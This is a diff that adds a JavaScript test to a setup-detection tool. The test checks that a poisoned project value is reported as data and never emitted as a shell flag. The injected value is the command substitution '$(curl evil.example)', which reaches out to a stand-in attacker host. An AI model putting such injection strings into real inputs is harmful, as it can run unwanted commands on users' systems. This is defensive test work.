@@ -81,6 +81,24 @@ test('a value with spaces is quoted in the flags, and the text line names the so
   }
 });
 
+test('a value that could run in a shell never becomes a flag', async () => {
+  const home = fs.mkdtempSync(path.join(ROOT, 'home-inject-'));
+  const previous = [process.env.HOME, process.env.USERPROFILE];
+  process.env.HOME = home;
+  process.env.USERPROFILE = home;
+  try {
+    // A cloned repository's context, repeated so it wins the majority.
+    recordProjects([1, 2, 3].map(() => makeProject({ framework: '$(curl evil.example)', test_runner: 'node:test' })), { home });
+    const target = fs.mkdtempSync(path.join(ROOT, 'new-'));
+    const json = await runSetupDetect({ args: [target], options: { json: true }, logger: logger() });
+    assert.equal(json.portfolio.suggested.framework.value, '$(curl evil.example)', 'reported as data');
+    assert.doesNotMatch(json.portfolio.flags, /--framework|\$\(/, 'never as a flag');
+    assert.match(json.portfolio.flags, /--test-runner=node:test/);
+  } finally {
+    [process.env.HOME, process.env.USERPROFILE] = previous;
+  }
+});
+
 test('@setup offers the portfolio where the workspace proves nothing, never writing it unconfirmed', () => {
   for (const root of [path.join(REPO, 'template', '.aioson'), path.join(REPO, '.aioson')]) {
     const kernel = fs.readFileSync(path.join(root, 'agents', 'setup.md'), 'utf8');
